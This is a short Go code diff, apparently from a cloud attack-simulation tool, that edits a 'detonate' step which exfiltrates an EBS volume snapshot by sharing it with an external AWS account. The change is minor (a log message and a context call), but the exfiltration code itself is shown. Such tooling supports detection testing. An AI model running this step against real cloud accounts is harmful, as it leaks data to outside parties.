@@ -40,9 +40,9 @@ func detonate(params map[string]string) error {
 	ourSnapshotId := params["snapshot_id"]
 
 	// Exfiltrate it
-	log.Println("Sharing the volume snapshot with an external AWS account ID...")
+	log.Println("Sharing the volume snapshot " + ourSnapshotId + " with an external AWS account...")
 
-	_, err := ec2Client.ModifySnapshotAttribute(context.TODO(), &ec2.ModifySnapshotAttributeInput{
+	_, err := ec2Client.ModifySnapshotAttribute(context.Background(), &ec2.ModifySnapshotAttributeInput{
 		SnapshotId: aws.String(ourSnapshotId),
 		Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
 		CreateVolumePermission: &types.CreateVolumePermissionModifications{
